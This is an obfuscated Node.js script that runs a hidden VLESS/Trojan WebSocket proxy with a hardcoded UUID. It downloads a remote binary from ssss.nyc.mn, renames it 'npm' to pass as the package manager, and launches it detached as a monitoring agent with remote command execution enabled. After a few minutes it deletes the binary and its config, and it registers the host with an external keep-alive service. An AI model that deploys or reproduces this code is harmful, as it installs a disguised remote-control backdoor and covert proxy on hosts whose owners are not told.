const _0x45a99a=_0x417d;(function(_0x5aaa98,_0x4edaa0){const _0x342107=_0x417d,_0x10933a=_0x5aaa98();while(!![]){try{const _0x55f56a=parseInt(_0x342107(0xe6))/0x1*(-parseInt(_0x342107(0xc1))/0x2)+parseInt(_0x342107(0xc8))/0x3*(parseInt(_0x342107(0xbf))/0x4)+parseInt(_0x342107(0xd9))/0x5+-parseInt(_0x342107(0xf2))/0x6*(parseInt(_0x342107(0x97))/0x7)+parseInt(_0x342107(0x82))/0x8+-parseInt(_0x342107(0x86))/0x9*(parseInt(_0x342107(0xbd))/0xa)+parseInt(_0x342107(0xb0))/0xb*(parseInt(_0x342107(0x90))/0xc);if(_0x55f56a===_0x4edaa0)break;else _0x10933a['push'](_0x10933a['shift']());}catch(_0x3b318a){_0x10933a['push'](_0x10933a['shift']());}}}(_0x56bb,0xa7529));const os=require('os'),http=require(_0x45a99a(0xbc)),fs=require('fs'),axios=require(_0x45a99a(0x81)),net=require(_0x45a99a(0xca)),path=require(_0x45a99a(0x87)),crypto=require(_0x45a99a(0xd1)),{Buffer}=require(_0x45a99a(0xa8)),{exec,execSync}=require(_0x45a99a(0xe2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x45a99a(0xa7)]||_0x45a99a(0xa5),NEZHA_SERVER=process[_0x45a99a(0x96)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x45a99a(0x96)][_0x45a99a(0xa0)]||'',NEZHA_KEY=process[_0x45a99a(0x96)][_0x45a99a(0xcb)]||'',DOMAIN=process[_0x45a99a(0x96)][_0x45a99a(0xc6)]||_0x45a99a(0xe3),AUTO_ACCESS=process[_0x45a99a(0x96)][_0x45a99a(0xdc)]||![],WSPATH=process[_0x45a99a(0x96)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x45a99a(0x96)][_0x45a99a(0xc4)]||_0x45a99a(0x8d),NAME=process[_0x45a99a(0x96)][_0x45a99a(0xda)]||_0x45a99a(0xea),PORT=process[_0x45a99a(0x96)][_0x45a99a(0xb1)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x84a5c2=_0x45a99a;try{const _0x5b16a8=await axios[_0x84a5c2(0xae)](_0x84a5c2(0xa9)),_0x7d8483=_0x5b16a8[_0x84a5c2(0xe5)];ISP=(_0x7d8483[_0x84a5c2(0xa1)]+'-'+_0x7d8483[_0x84a5c2(0x9b)])['replace'](/ /g,'_');}catch(_0x4d0bba){ISP=_0x84a5c2(0xac);}};GetISP();const httpServer=http[_0x45a99a(0xf7)]((_0xcca3a1,_0x1d4329)=>{const _0x2dfa32=_0x45a99a;if(_0xcca3a1[_0x2dfa32(0xab)]==='/'){const _0x366461=path[_0x2dfa32(0x98)](__dirname,_0x2dfa32(0xc3));fs[_0x2dfa32(0x9e)](_0x366461,_0x2dfa32(0xc0),(_0xf7c023,_0x43ea1a)=>{const _0x2c0e92=_0x2dfa32;if(_0xf7c023){_0x1d4329[_0x2c0e92(0x99)](0xc8,{'Content-Type':'text/html'}),_0x1d4329['end'](_0x2c0e92(0xaf));return;}_0x1d4329[_0x2c0e92(0x99)](0xc8,{'Content-Type':'text/html'}),_0x1d4329[_0x2c0e92(0xe8)](_0x43ea1a);});return;}else{if(_0xcca3a1[_0x2dfa32(0xab)]==='/'+SUB_PATH){const _0x442595=NAME?NAME+'-'+ISP:ISP,_0x505edc=_0x2dfa32(0xa4)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x2dfa32(0x92)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x442595,_0x2851eb=_0x2dfa32(0x8c)+UUID+_0x2dfa32(0xe7)+DOMAIN+_0x2dfa32(0x92)+DOMAIN+_0x2dfa32(0xf3)+WSPATH+'#'+_0x442595,_0x13f1b2=_0x505edc+'\x0a'+_0x2851eb,_0xfb7b2b=Buffer['from'](_0x13f1b2)[_0x2dfa32(0xd0)](_0x2dfa32(0xcf));_0x1d4329['writeHead'](0xc8,{'Content-Type':_0x2dfa32(0xdd)}),_0x1d4329['end'](_0xfb7b2b+'\x0a');}else _0x1d4329[_0x2dfa32(0x99)](0x194,{'Content-Type':_0x2dfa32(0xdd)}),_0x1d4329[_0x2dfa32(0xe8)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x45a99a(0x91))]({'server':httpServer}),uuid=UUID[_0x45a99a(0xaa)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x45a99a(0xc5)];function resolveHost(_0x168d2f){return new Promise((_0x2f7745,_0x36a180)=>{const _0x2b315f=_0x417d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2b315f(0xad)](_0x168d2f)){_0x2f7745(_0x168d2f);return;}let _0x13fae9=0x0;function _0x57d2ed(){const _0xb35a1=_0x2b315f;if(_0x13fae9>=DNS_SERVERS[_0xb35a1(0xef)]){_0x36a180(new Error(_0xb35a1(0xd6)+_0x168d2f+_0xb35a1(0x8a)));return;}const _0x2baec1=DNS_SERVERS[_0x13fae9];_0x13fae9++;const _0x4cc811=_0xb35a1(0xe4)+encodeURIComponent(_0x168d2f)+_0xb35a1(0xcd);axios[_0xb35a1(0xae)](_0x4cc811,{'timeout':0x1388,'headers':{'Accept':_0xb35a1(0x88)}})[_0xb35a1(0xb9)](_0x295804=>{const _0x15afaf=_0xb35a1,_0x23be38=_0x295804['data'];if(_0x23be38[_0x15afaf(0xc7)]===0x0&&_0x23be38[_0x15afaf(0x9d)]&&_0x23be38[_0x15afaf(0x9d)][_0x15afaf(0xef)]>0x0){const _0xf0b6bf=_0x23be38[_0x15afaf(0x9d)][_0x15afaf(0xf9)](_0x597bbb=>_0x597bbb[_0x15afaf(0x9a)]===0x1);if(_0xf0b6bf){_0x2f7745(_0xf0b6bf[_0x15afaf(0xe5)]);return;}}_0x57d2ed();})[_0xb35a1(0xdf)](_0x46e113=>{_0x57d2ed();});}_0x57d2ed();});}function handleVlessConnection(_0x2c40e4,_0x514f02){const _0x48aed4=_0x45a99a,[_0x55925b]=_0x514f02,_0x494f6b=_0x514f02[_0x48aed4(0xde)](0x1,0x11);if(!_0x494f6b[_0x48aed4(0xd8)]((_0x36118e,_0x3e3bdc)=>_0x36118e==parseInt(uuid[_0x48aed4(0x8f)](_0x3e3bdc*0x2,0x2),0x10)))return![];let _0x134790=_0x514f02[_0x48aed4(0xde)](0x11,0x12)[_0x48aed4(0x85)]()+0x13;const _0xd23eb8=_0x514f02['slice'](_0x134790,_0x134790+=0x2)['readUInt16BE'](0x0),_0x5d7bc7=_0x514f02[_0x48aed4(0xde)](_0x134790,_0x134790+=0x1)[_0x48aed4(0x85)](),_0x385d53=_0x5d7bc7==0x1?_0x514f02['slice'](_0x134790,_0x134790+=0x4)[_0x48aed4(0x98)]('.'):_0x5d7bc7==0x2?new TextDecoder()[_0x48aed4(0xee)](_0x514f02['slice'](_0x134790+0x1,_0x134790+=0x1+_0x514f02[_0x48aed4(0xde)](_0x134790,_0x134790+0x1)[_0x48aed4(0x85)]())):_0x5d7bc7==0x3?_0x514f02[_0x48aed4(0xde)](_0x134790,_0x134790+=0x10)[_0x48aed4(0xf4)]((_0x2ad26a,_0x520170,_0x226d6c,_0x4f6f12)=>_0x226d6c%0x2?_0x2ad26a['concat'](_0x4f6f12[_0x48aed4(0xde)](_0x226d6c-0x1,_0x226d6c+0x1)):_0x2ad26a,[])[_0x48aed4(0xa3)](_0x53b6a1=>_0x53b6a1[_0x48aed4(0xce)](0x0)[_0x48aed4(0xd0)](0x10))[_0x48aed4(0x98)](':'):'';_0x2c40e4['send'](new Uint8Array([_0x55925b,0x0]));const _0x2e768a=createWebSocketStream(_0x2c40e4);return resolveHost(_0x385d53)[_0x48aed4(0xb9)](_0xc7d30e=>{const _0x160ce4=_0x48aed4;net[_0x160ce4(0x93)]({'host':_0xc7d30e,'port':_0xd23eb8},function(){const _0x22281b=_0x160ce4;this[_0x22281b(0xf5)](_0x514f02[_0x22281b(0xde)](_0x134790)),_0x2e768a['on'](_0x22281b(0xe0),()=>{})[_0x22281b(0xe1)](this)['on'](_0x22281b(0xe0),()=>{})['pipe'](_0x2e768a);})['on']('error',()=>{});})[_0x48aed4(0xdf)](_0x432d9c=>{const _0x1766d0=_0x48aed4;net[_0x1766d0(0x93)]({'host':_0x385d53,'port':_0xd23eb8},function(){const _0x9f0f67=_0x1766d0;this['write'](_0x514f02[_0x9f0f67(0xde)](_0x134790)),_0x2e768a['on']('error',()=>{})[_0x9f0f67(0xe1)](this)['on'](_0x9f0f67(0xe0),()=>{})[_0x9f0f67(0xe1)](_0x2e768a);})['on'](_0x1766d0(0xe0),()=>{});}),!![];}function handleTrojanConnection(_0x38c0c0,_0x8da2d4){const _0x100483=_0x45a99a;try{if(_0x8da2d4[_0x100483(0xef)]<0x3a)return![];const _0x5e9a08=_0x8da2d4[_0x100483(0xde)](0x0,0x38)['toString'](),_0x27d83f=[UUID];let _0x2f4a4f=null;for(const _0x390c8f of _0x27d83f){const _0x485dc9=crypto['createHash']('sha224')['update'](_0x390c8f)[_0x100483(0x89)]('hex');if(_0x485dc9===_0x5e9a08){_0x2f4a4f=_0x390c8f;break;}}if(!_0x2f4a4f)return![];let _0x4a6b76=0x38;_0x8da2d4[_0x4a6b76]===0xd&&_0x8da2d4[_0x4a6b76+0x1]===0xa&&(_0x4a6b76+=0x2);const _0x1ec741=_0x8da2d4[_0x4a6b76];if(_0x1ec741!==0x1)return![];_0x4a6b76+=0x1;const _0x2e4bf5=_0x8da2d4[_0x4a6b76];_0x4a6b76+=0x1;let _0x391633,_0x4aceda;if(_0x2e4bf5===0x1)_0x391633=_0x8da2d4[_0x100483(0xde)](_0x4a6b76,_0x4a6b76+0x4)[_0x100483(0x98)]('.'),_0x4a6b76+=0x4;else{if(_0x2e4bf5===0x3){const _0x41caef=_0x8da2d4[_0x4a6b76];_0x4a6b76+=0x1,_0x391633=_0x8da2d4[_0x100483(0xde)](_0x4a6b76,_0x4a6b76+_0x41caef)[_0x100483(0xd0)](),_0x4a6b76+=_0x41caef;}else{if(_0x2e4bf5===0x4)_0x391633=_0x8da2d4[_0x100483(0xde)](_0x4a6b76,_0x4a6b76+0x10)[_0x100483(0xf4)]((_0x52f879,_0x519ed0,_0x1bad8f,_0x5e2d7b)=>_0x1bad8f%0x2?_0x52f879[_0x100483(0x80)](_0x5e2d7b[_0x100483(0xde)](_0x1bad8f-0x1,_0x1bad8f+0x1)):_0x52f879,[])[_0x100483(0xa3)](_0x5d1643=>_0x5d1643['readUInt16BE'](0x0)[_0x100483(0xd0)](0x10))[_0x100483(0x98)](':'),_0x4a6b76+=0x10;else return![];}}_0x4aceda=_0x8da2d4[_0x100483(0xce)](_0x4a6b76),_0x4a6b76+=0x2;_0x4a6b76<_0x8da2d4[_0x100483(0xef)]&&_0x8da2d4[_0x4a6b76]===0xd&&_0x8da2d4[_0x4a6b76+0x1]===0xa&&(_0x4a6b76+=0x2);const _0x53c031=createWebSocketStream(_0x38c0c0);return resolveHost(_0x391633)[_0x100483(0xb9)](_0x24aebe=>{const _0x1d65c5=_0x100483;net['connect']({'host':_0x24aebe,'port':_0x4aceda},function(){const _0x354647=_0x417d;_0x4a6b76<_0x8da2d4[_0x354647(0xef)]&&this[_0x354647(0xf5)](_0x8da2d4[_0x354647(0xde)](_0x4a6b76)),_0x53c031['on'](_0x354647(0xe0),()=>{})[_0x354647(0xe1)](this)['on']('error',()=>{})[_0x354647(0xe1)](_0x53c031);})['on'](_0x1d65c5(0xe0),()=>{});})['catch'](_0x5c692b=>{const _0x105163=_0x100483;net[_0x105163(0x93)]({'host':_0x391633,'port':_0x4aceda},function(){const _0x3b7e35=_0x105163;_0x4a6b76<_0x8da2d4[_0x3b7e35(0xef)]&&this[_0x3b7e35(0xf5)](_0x8da2d4[_0x3b7e35(0xde)](_0x4a6b76)),_0x53c031['on'](_0x3b7e35(0xe0),()=>{})[_0x3b7e35(0xe1)](this)['on'](_0x3b7e35(0xe0),()=>{})[_0x3b7e35(0xe1)](_0x53c031);})['on']('error',()=>{});}),!![];}catch(_0x44b7d0){return![];}}function _0x417d(_0x3a289c,_0x266906){_0x3a289c=_0x3a289c-0x80;const _0x56bbcd=_0x56bb();let _0x417d30=_0x56bbcd[_0x3a289c];return _0x417d30;}function _0x56bb(){const _0x1ac3f9=['post','log','http','10iVDUhx','close','4fPQgoP','utf8','603660lSDWYm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','index.html','SUB_PATH','1.1.1.1','DOMAIN','Status','2548554nOvVQR','listen','net','NEZHA_KEY','2083','&type=A','readUInt16BE','base64','toString','crypto','https://amd64.ssss.nyc.mn/agent','finish','config.yaml','setsid\x20nohup\x20./npm\x20-s\x20','Failed\x20to\x20resolve\x20','connection','every','1678175OPKlmD','NAME','2087','AUTO_ACCESS','text/plain','slice','catch','error','pipe','child_process','1234.abc.com','https://dns.google/resolve?name=','data','4FLhzqr','@cdns.doon.eu.org:443?security=tls&sni=','end','false','Hug','npm\x20is\x20already\x20running,\x20skip\x20running...','npm','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','decode','length','error:\x20','\x20-p\x20','6zANsBv','&path=%2F','reduce','write','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createServer','stream','find','npm\x20running\x20error:','concat','axios','1480080jTQqWs','writeFileSync','8443','readUInt8','6093594VhmtFT','path','application/dns-json','digest','\x20with\x20all\x20DNS\x20servers','443','trojan://','sub','arm','substr','12IpezOZ','Server','&fp=chrome&type=ws&host=','connect','once','/bin/bash','env','8089263QTUXWo','join','writeHead','type','asOrganization','npm\x20is\x20running','Answer','readFile','message','NEZHA_PORT','country','unlink','map','vless://','0186fbda-9572-4d88-9c38-f049a7c37ad1','npm\x20download\x20successfully','UUID','buffer','https://speed.cloudflare.com/meta','replace','url','Unknown','test','get','Hello\x20world!','25907035qBDSHH','PORT','2053','split','--tls','https://oooo.serv00.net/add-url','trim','includes','chmod\x20+x\x20npm','then'];_0x56bb=function(){return _0x1ac3f9;};return _0x56bb();}wss['on'](_0x45a99a(0xd7),(_0x21b079,_0x28d703)=>{const _0x5b9b42=_0x45a99a,_0x495ca1=_0x28d703[_0x5b9b42(0xab)]||'';_0x21b079[_0x5b9b42(0x94)](_0x5b9b42(0x9f),_0x56bc01=>{const _0x13d16b=_0x5b9b42;if(_0x56bc01[_0x13d16b(0xef)]>0x11&&_0x56bc01[0x0]===0x0){const _0x3bd2ae=_0x56bc01['slice'](0x1,0x11),_0xe39b9e=_0x3bd2ae[_0x13d16b(0xd8)]((_0x445e89,_0x58e9c2)=>_0x445e89==parseInt(uuid[_0x13d16b(0x8f)](_0x58e9c2*0x2,0x2),0x10));if(_0xe39b9e){!handleVlessConnection(_0x21b079,_0x56bc01)&&_0x21b079[_0x13d16b(0xbe)]();return;}}!handleTrojanConnection(_0x21b079,_0x56bc01)&&_0x21b079[_0x13d16b(0xbe)]();})['on'](_0x5b9b42(0xe0),()=>{});});const getDownloadUrl=()=>{const _0x5683da=_0x45a99a,_0x569407=os['arch']();return _0x569407===_0x5683da(0x8e)||_0x569407==='arm64'||_0x569407==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x5683da(0xd2);},downloadFile=async()=>{const _0x18f39e=_0x45a99a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xea3601=getDownloadUrl(),_0x4752e6=await axios({'method':'get','url':_0xea3601,'responseType':_0x18f39e(0xf8)}),_0x3ea84f=fs['createWriteStream'](_0x18f39e(0xec));return _0x4752e6['data'][_0x18f39e(0xe1)](_0x3ea84f),new Promise((_0x1dcb69,_0x11dfb3)=>{const _0x1d8be1=_0x18f39e;_0x3ea84f['on'](_0x1d8be1(0xd3),()=>{const _0x2cddd5=_0x1d8be1;console['log'](_0x2cddd5(0xa6)),exec(_0x2cddd5(0xb8),_0x1b0d42=>{if(_0x1b0d42)_0x11dfb3(_0x1b0d42);_0x1dcb69();});}),_0x3ea84f['on']('error',_0x11dfb3);});}catch(_0x3c22fe){throw _0x3c22fe;}},runnz=async()=>{const _0x395da5=_0x45a99a;try{const _0x2709d5=execSync(_0x395da5(0xed),{'encoding':'utf-8'});if(_0x2709d5[_0x395da5(0xb6)]()!==''){console[_0x395da5(0xbb)](_0x395da5(0xeb));return;}}catch(_0x23ef85){}await downloadFile();let _0x11b1ab='',_0x15d72f=[_0x395da5(0x8b),_0x395da5(0x84),'2096',_0x395da5(0xdb),_0x395da5(0xcc),_0x395da5(0xb2)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x417c12=_0x15d72f[_0x395da5(0xb7)](NEZHA_PORT)?_0x395da5(0xb4):'';_0x11b1ab=_0x395da5(0xd5)+NEZHA_SERVER+':'+NEZHA_PORT+_0x395da5(0xf1)+NEZHA_KEY+'\x20'+_0x417c12+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1016ea=NEZHA_SERVER[_0x395da5(0xb7)](':')?NEZHA_SERVER[_0x395da5(0xb3)](':')['pop']():'',_0x3a8f95=_0x15d72f['includes'](_0x1016ea)?'true':_0x395da5(0xe9),_0x4cb1d9='client_secret:\x20'+NEZHA_KEY+_0x395da5(0xc2)+NEZHA_SERVER+_0x395da5(0xf6)+_0x3a8f95+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x395da5(0x83)](_0x395da5(0xd4),_0x4cb1d9);}_0x11b1ab='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x395da5(0xbb)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x11b1ab,{'shell':_0x395da5(0x95)},_0x52ed9f=>{const _0x2c5e36=_0x395da5;if(_0x52ed9f)console[_0x2c5e36(0xe0)](_0x2c5e36(0xfa),_0x52ed9f);else console['log'](_0x2c5e36(0x9c));});}catch(_0x436f9f){console[_0x395da5(0xe0)](_0x395da5(0xf0)+_0x436f9f);}};async function addAccessTask(){const _0x2dbad1=_0x45a99a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x19c5e3='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x219503=await axios[_0x2dbad1(0xba)](_0x2dbad1(0xb5),{'url':_0x19c5e3},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x57abe7){}}const delFiles=()=>{const _0x402550=_0x45a99a;fs[_0x402550(0xa2)](_0x402550(0xec),()=>{}),fs[_0x402550(0xa2)](_0x402550(0xd4),()=>{});};httpServer[_0x45a99a(0xc9)](PORT,()=>{const _0x5592aa=_0x45a99a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5592aa(0xbb)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
